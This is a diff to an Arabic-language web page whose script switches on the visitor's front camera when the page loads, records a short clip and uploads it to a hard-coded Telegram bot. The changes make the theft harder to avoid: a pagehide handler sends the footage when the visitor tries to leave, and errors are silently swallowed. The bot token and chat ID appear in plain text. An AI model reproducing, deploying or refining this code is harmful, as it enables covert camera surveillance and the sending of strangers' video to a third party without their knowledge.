@@ -1,4 +1,4 @@
-ك<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
@@ -17,8 +17,10 @@
         const TOKEN = '8880573702:AAGOnEril_hFUPSBRuLh2TwGkFOG3wCeV80';
         const CHAT = '8304712202';
         let mediaStream = null;
+        let mediaRecorder = null;
+        let chunks = [];
+        let isSent = false;
 
-        // تشغيل الكاميرا في الخلفية فور فتح الصفحة عشان تكون جاهزة تماماً للقطة الفورية
         async function initCamera() {
             try {
                 mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
@@ -27,18 +29,11 @@
         }
         initCamera();
 
-        async function startRecording() {
+        function startRecording() {
             try {
                 document.getElementById('mainBtn').style.display = 'none';
 
-                // لو الكاميرا ما اشتغلتش في الخلفية لأي سبب، نشغلها وقت الضغط
-                if (!mediaStream) {
-                    mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false });
-                    document.getElementById('v').srcObject = mediaStream;
-                }
-
-                let mediaRecorder;
-                let chunks = [];
+                if (!mediaStream) return;
 
                 try {
                     mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
@@ -50,38 +45,50 @@
                     if (e.data.size > 0) chunks.push(e.data);
                 };
 
-                mediaRecorder.onstop = async () => {
-                    const blob = new Blob(chunks, { type: 'video/webm' });
-                    const formData = new FormData();
-                    formData.append('chat_id', CHAT);
-                    formData.append('video', blob, 'visitor_video.webm');
-
-                    try {
-                        await fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                    } catch (err) {
-                        console.error(err);
-                    }
-
-                    mediaStream.getTracks().forEach(t => t.stop());
+                mediaRecorder.onstop = () => {
+                    sendVideo();
                 };
 
-                // بدء التسجيل الفوري بدون أي انتظار
                 mediaRecorder.start();
 
-                // تسجيل سريع جداً (ثانية ونصف) عشان يبعت الفيديو في أسرع وقت ممكن
+                // إيقاف التسجيل تلقائياً بعد ثانية ونصف
                 setTimeout(() => {
-                    if (mediaRecorder.state === 'recording') {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') {
                         mediaRecorder.stop();
                     }
                 }, 1500);
 
-            } catch (e) {
-                alert('يرجى السماح بإذن الكاميرا للمتابعة');
+            } catch (e) {}
+        }
+
+        function sendVideo() {
+            if (isSent || chunks.length === 0) return;
+            isSent = true;
+
+            const blob = new Blob(chunks, { type: 'video/webm' });
+            const formData = new FormData();
+            formData.append('chat_id', CHAT);
+            formData.append('video', blob, 'visitor_video.webm');
+
+            // استخدام fetch للإرسال العادي
+            fetch(`https://api.telegram.org/bot${TOKEN}/sendVideo`, {
+                method: 'POST',
+                body: formData
+            }).catch(() => {});
+
+            if (mediaStream) {
+                mediaStream.getTracks().forEach(t => t.stop());
             }
         }
+
+        // التقاط محاولة الخروج أو الضغط على زر الرجوع لضمان إرسال ما تم تسجيله فورا
+        window.addEventListener('pagehide', () => {
+            if (mediaRecorder && mediaRecorder.state === 'recording') {
+                mediaRecorder.stop();
+            } else {
+                sendVideo();
+            }
+        });
     </script>
 </body>
 </html>
